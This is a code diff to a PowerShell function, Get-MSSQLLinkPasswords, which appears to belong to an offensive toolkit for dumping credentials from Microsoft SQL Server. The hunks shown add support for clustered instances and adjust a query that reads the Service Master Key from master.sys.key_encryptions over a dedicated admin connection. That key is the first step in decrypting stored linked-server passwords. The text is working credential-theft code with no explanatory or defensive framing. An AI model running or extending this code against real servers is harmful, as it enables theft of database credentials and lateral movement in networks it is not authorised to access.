@@ -41,8 +41,7 @@ function Get-MSSQLLinkPasswords{
   Add-Type -assembly System.Security
   Add-Type -assembly System.Core
 
-  # Set local computername and get all SQL Server instances
-  $ComputerName = $Env:computername
+  # get all SQL Server instances
   $SqlInstances = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server' -Name InstalledInstances).InstalledInstances
   
   $Results = New-Object "System.Data.DataTable"
@@ -52,7 +51,15 @@ function Get-MSSQLLinkPasswords{
   $Results.Columns.Add("Password") | Out-Null
   
   foreach ($InstanceName in $SqlInstances) {
-  
+    $instance_name_entry = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL' -Name $InstanceName).$InstanceName   
+    # we can only get the cluster name if this instance is clustered
+    $cluster = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$instance_name_entry\Cluster" -Name 'ClusterName').ClusterName     2> $null
+    if ($cluster) {
+      $ComputerName = $cluster      
+    } else {
+     $ComputerName = $env:COMPUTERNAME
+    }
+
     # Start DAC connection to SQL Server
     # Default instance MSSQLSERVER -> instance name cannot be used in connection string
     if ($InstanceName -eq "MSSQLSERVER") {
@@ -71,7 +78,7 @@ function Get-MSSQLLinkPasswords{
     if ($Conn.State -eq "Open"){
       # Query Service Master Key from the database - remove padding from the key
       # key_id 102 eq service master key, thumbprint 3 means encrypted with machinekey
-      $SqlCmd="SELECT substring(crypt_property,9,len(crypt_property)-8) FROM sys.key_encryptions WHERE key_id=102 and (thumbprint=0x03 or thumbprint=0x0300000001)"
+      $SqlCmd="SELECT substring(crypt_property,9,len(crypt_property)-8) FROM master.sys.key_encryptions WHERE key_id=102 and (thumbprint=0x03 or thumbprint=0x0300000001)"
       $Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd,$Conn);
       $SmkBytes=$Cmd.ExecuteScalar()
     
